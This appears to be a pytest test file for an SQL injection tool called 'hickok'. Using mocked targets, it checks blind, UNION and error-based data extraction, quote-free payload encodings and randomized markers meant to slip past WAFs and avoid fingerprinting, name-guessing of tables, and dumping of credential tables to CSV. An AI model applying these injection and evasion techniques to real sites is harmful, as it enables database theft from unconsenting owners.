from hickok import sqli
from hickok.sqlcache import Cache


def test_runaway_value_is_not_cached(tmp_path, monkeypatch):
    """A biased oracle (every request timing out, say) runs the search to the
    ceiling; that junk value must NOT be cached, or it poisons every later run."""
    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))

    class _AlwaysTrue:
        def ask(self, cond):
            return True

    o = _AlwaysTrue()
    o.cache = Cache("http://t/p?id=1", "id")
    sqli.extract_int(o, "x", cap=256)          # runs away to the ceiling
    assert len(o.cache) == 0                   # not cached — no poison
    o.cache.close()


def test_empty_response_reads_as_false():
    """An empty body (a timed-out request) reads as False, so it can't bias the
    binary search to True and run away into junk."""
    class _Dead:
        count = 0

        def get(self, url):
            return ""

    o = sqli.Oracle(_Dead(), "http://t/p?id=1", "id", "1", "{v} AND {c}",
                    "numeric", "a normal page", "an error page")
    assert o.ask("1=1") is False


def test_extract_str_survives_a_junk_oracle():
    """A noisy/unreliable oracle can make the binary search converge on a junk
    code point; extract_str must yield '?' for it, never crash on chr()."""
    class _Junk:
        def ask(self, cond):           # always "yes" → search runs up to the cap
            return True

        @property
        def count(self):
            return 0

    out = sqli.extract_str(_Junk(), sqli._PROFILES["sqlite"], "x", maxlen=8)
    assert out == "?" * 8


def test_anomalous_page_is_flagged_not_silently_false():
    """A response matching neither calibrated page (a WAF/filter block, like a
    denylisted keyword) is counted as an anomaly, so the walk can warn and fall
    back instead of silently reading zero tables."""
    class _Http:
        count = 0

        def get(self, url):
            return "Some things are disabled!!!"      # neither the true nor false page

    o = sqli.Oracle(_Http(), "http://t/p?id=1", "id", "1", "{v} AND ({c})",
                    "numeric", "the normal article listing page goes here",
                    "an empty no-results page goes here")
    o.ask("(SELECT count(*) FROM information_schema.tables)>1")
    assert o.blocked == 1


def test_blocked_catalog_count_does_not_run_away():
    """A blind catalog walk whose count query is filtered (every probe anomalous)
    must yield nothing — so the caller falls back to by-name — instead of reading a
    runaway count and trying to extract millions of rows."""
    class _Blocked:
        cache = None
        count = 0

        def __init__(self):
            self.blocked = 0

        def ask(self, cond):
            self.blocked += 1           # every probe is a WAF block (a third state)
            return True                 # ...biased True, which would run the count away

    prof = sqli._PROFILES["sqlite"]
    out = list(sqli._list(_Blocked(), prof, prof["tables_n"], prof["table_at"]))
    assert out == []                    # bailed on the anomaly, extracted nothing


def test_union_payloads_carry_no_quote_characters():
    """A WAF that strips single quotes breaks every quoted literal. The UNION path
    must encode its markers/separators/table names quote-free, so reflection still
    works on such a target — verified here by asserting no `'` reaches the wire."""
    sent = []

    class _Http:
        count = 0

        def get(self, url):
            sent.append(url)
            return "x"                                   # reflect nothing → returns ""

    o = sqli.Oracle(_Http(), "http://t/p?id=1", "id", "1", "{v} AND ({c})",
                    "numeric", "true", "false")
    for dbms in ("mysql", "sqlite", "postgres", "mssql"):
        sent.clear()
        sqli.union_setup(_Http(), o, dbms)               # marker probe
        sqli.union_value(_Http(), o, dbms, 4, 0, "SELECT version()")
        sqli.union_databases(_Http(), o, dbms, 4, 0)     # catalog predicate: type='table' / 'public'
        sqli.union_tables(_Http(), o, dbms, 4, 0)
        sqli.union_columns(_Http(), o, dbms, 4, 0, "app_users")
        sqli.union_dump(_Http(), o, dbms, 4, 0, "app_users", ["a", "b"])
        assert all("%27" not in u and "'" not in u for u in sent), (dbms, sent)


def test_union_markers_are_per_run_and_quote_free():
    """Each oracle mints its own UNION markers (no static on-wire fingerprint), the
    three are distinct, and they survive a quote-stripping WAF — they reach the wire
    encoded via _strlit, never quoted."""
    a, b = sqli._new_marks(), sqli._new_marks()
    assert a != b                                       # randomized per run
    assert len({a.umark, a.rowsep, a.colsep}) == 3      # distinct delimiters
    for dbms in ("mysql", "sqlite", "postgres", "mssql"):
        for tag in a:
            assert "'" not in sqli._strlit(dbms, tag)


def test_oracle_carries_its_own_markers():
    """A constructed oracle gets a marker set, so the union helpers never fall back to
    the shared defaults on a real walk."""
    o = sqli.Oracle(object(), "http://t/p?id=1", "id", "1", "{v} AND ({c})",
                    "numeric", "true", "false")
    assert o.marks != sqli._DEFAULT_MARKS
    assert sqli._marks_of(o) is o.marks


def test_save_dump_writes_a_csv_with_header_and_rows(tmp_path, monkeypatch):
    """A dump is persisted to CSV (header + rows) so it survives the session, and
    the path is returned so the CLI can show where it went."""
    import csv as _csv

    from hickok import sqlcache

    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    path = sqlcache.save_dump("http://host:80/p.php?id=1", "id", "level1_users",
                              ["id", "username", "password"],
                              [["1", "Hornoxe", "thatwaseasy"]], database="shop")
    assert path is not None and path.exists() and path.suffix == ".csv"
    assert str(path).startswith(str(tmp_path))           # default lands under XDG data home
    assert path.parent.name == "shop" and "dump" in path.parts   # dump/<database>/<table>.csv
    rows = list(_csv.reader(path.read_text(encoding="utf-8").splitlines()))
    assert rows[0] == ["id", "username", "password"]
    assert rows[1] == ["1", "Hornoxe", "thatwaseasy"]

    # --output overrides the dump root, keeping <database>/<table>.csv inside it
    out = sqlcache.save_dump("http://host/p.php?id=1", "id", "level1_users",
                             ["id"], [["1"]], database="shop", out_dir=tmp_path / "engagement")
    assert out == tmp_path / "engagement" / "shop" / "level1_users.csv" and out.exists()


def test_target_dir_gathers_log_target_and_cache(tmp_path, monkeypatch):
    """A target+param has one self-contained folder holding its log, target.txt and the
    resume cache — instead of dumps and caches scattered across the data dir."""
    from hickok import sqlcache

    monkeypatch.setenv("XDG_DATA_HOME", str(tmp_path))
    url, param = "http://127.0.0.1:80/p.php?id=1", "id"
    d = sqlcache.target_dir(url, param)
    assert sqlcache.log_path(url, param) == d / "log.txt"
    sqlcache.write_target(url, param, {"target": url, "technique": "error-based", "dbms": "mysql"})
    body = (d / "target.txt").read_text()
    assert "error-based" in body and "mysql" in body
    cache = sqlcache.Cache(url, param)
    cache.put("x", 1)
    cache.close()
    assert (d / "cache.jsonl").exists()                  # resume cache lives in the same folder


def test_print_table_survives_a_ragged_row():
    """A cell value can contain a column separator, yielding a row with more/fewer
    fields than the header. Printing must not index out of range."""
    from hickok import cli

    out = []

    class _C:
        def plain(self, s):
            out.append(s)

        def _c(self, color, s):
            return s

    cli._print_table(_C(), ["a", "b", "c"], [["1", "2"], ["x", "y", "z", "extra"]])
    assert len(out) == 4                                 # header + rule + 2 rows, no crash


def test_repl_use_switches_the_working_database(monkeypatch):
    """`use <db>` re-points tables/columns/dump at another database (the walk is then
    issued against it) and the prompt shows it; `use -` returns to the current one."""
    from hickok import cli, sqli

    seen, prompts = [], []
    monkeypatch.setattr(cli, "_tables_in",
                        lambda c, oracle, prof, union, db: seen.append(db) or [])

    class _Spin:
        def __enter__(self): return self
        def __exit__(self, *e): return False

    class _C:
        def plain(self, *a): pass
        def good(self, *a): pass
        def warn(self, *a): pass
        def _c(self, color, s): return s
        def working(self, *a, **k): return _Spin()

    class _O:
        count = 0
        _curdb = "main"            # current db known (as _overview would have cached it)

    lines = iter(["tables", "use archive", "tables", "use -", "tables", "exit"])
    monkeypatch.setattr("builtins.input",
                        lambda prompt="": prompts.append(prompt) or next(lines))

    cli._sql_repl(_C(), _O(), sqli._PROFILES["mysql"], "mysql", ("mysql", 3, 0))

    assert seen == [None, "archive", None]            # current → archive → back to current
    assert "hickok(sql:archive)> " in prompts         # prompt reflects the working db
    assert "hickok(sql)> " in prompts                 # …and the default


def test_strlit_decodes_to_the_original_text():
    """Quote-free literals are just an encoding — they must round-trip to the same
    string the DBMS renders, or output matching would silently miss them."""
    assert sqli._strlit("mysql", "AB") == "0x4142"
    assert sqli._strlit("sqlite", "AB") == "char(65,66)"
    assert sqli._strlit("postgres", "AB") == "(chr(65)||chr(66))"
    assert sqli._strlit("mssql", "AB") == "(char(65)+char(66))"
    assert "'" not in sqli._strlit("mysql", "app_users")


def test_common_tables_probes_by_name_without_information_schema():
    """When the catalog is blocked, existence is probed by name — the payloads
    must never touch information_schema."""
    seen = []

    class _O:
        cache = None

        def ask(self, cond):
            seen.append(cond)
            return "FROM users)" in cond              # only 'users' exists

    found = list(sqli.common_tables(_O(), names=["users", "ghosts", "admin"]))
    assert found == ["users"]
    assert not any("information_schema" in s for s in seen)


def test_union_calibrate_finds_a_union_without_a_boolean_oracle():
    """A reflected target whose base value matches no row has no true/false differential
    (boolean calibration fails), but UNION still works. union_calibrate finds it by trying
    quote contexts directly, and fingerprints the DBMS by which quote-free encoding renders
    the marker — here a double-quoted SQLite lookup (`char()` reflects, `0x..` doesn't)."""
    import re
    from urllib.parse import unquote_plus, urlsplit

    NCOLS = 3

    class _Http:                                   # a double-quoted UNION target, no row match
        count = 0

        def get(self, url):
            q = urlsplit(url).query
            payload = unquote_plus(q.split("box=", 1)[-1]) if "box=" in q else ""
            if '"' not in payload:                 # the string is double-quoted: only " breaks out
                return "no such box"
            after = payload.split('"', 1)[1]
            m = re.search(r"ORDER BY (\d+)", after, re.I)
            if m:
                return "no such box" if int(m.group(1)) <= NCOLS else "query error: out of range"
            decoded = "".join(                     # render any char(...) (SQLite) back to text
                "".join(chr(int(x)) for x in mm.group(1).split(","))
                for mm in re.finditer(r"char\(([\d,]+)\)", after))
            return f"box row: {decoded}" if decoded else "no such box"

    found = sqli.union_calibrate(_Http(), "http://t/app?box=DW", "box", "DW")
    assert found is not None
    oracle, dbms, ncols, refcol = found
    assert dbms == "sqlite" and ncols == NCOLS and oracle.context == "double-quote"


def test_error_channel_guesses_tables_and_columns_by_name():
    """When information_schema is unavailable on an error-based target (e.g. a SQLite
    backend modelling MySQL's error channel), enumeration falls back to by-name probing:
    count(*)/count(col) leaks a number if the object exists, errors (empty) if not."""
    import re

    world = {"secrets": {"label", "value", "id"}}        # the only table that 'exists'

    class _EO:                                            # a stand-in error oracle
        dbms = "mysql"

        def read(self, expr):
            m = re.search(r"count\(\*\) FROM `?(\w+)`?", expr)
            if m:                                        # table-existence probe
                return "1" if m.group(1) in world else ""
            m = re.search(r"count\((\w+)\) FROM `?(\w+)`?", expr)
            if m:                                        # column-existence probe
                col, tab = m.group(1), m.group(2)
                return "1" if tab in world and col in world[tab] else ""
            return ""

    eo = _EO()
    assert list(sqli.error_common_tables(eo)) == ["secrets"]     # only the real table
    cols = list(sqli.error_common_columns(eo, "secrets"))
    assert "value" in cols and "label" in cols and "id" in cols  # the flag column included
    assert "password" not in cols                                # a name that isn't there


def test_common_tables_tries_db_prefixed_and_more_names():
    """With the database name known, the guesser also probes `<db>_<name>` — and
    the plain common list is broad enough to cover ordinary names too."""
    seen = []

    class _O:
        cache = None

        def ask(self, cond):
            seen.append(cond)
            return "FROM shop_customers)" in cond        # only the db-prefixed one exists

    found = list(sqli.common_tables(_O(), db="shop"))
    assert found == ["shop_customers"]
    assert any("FROM shop_customers)" in s for s in seen)  # <db>_<name> was tried
    assert any("FROM users)" in s for s in seen)           # plain names still tried
    assert not any("information_schema" in s for s in seen)
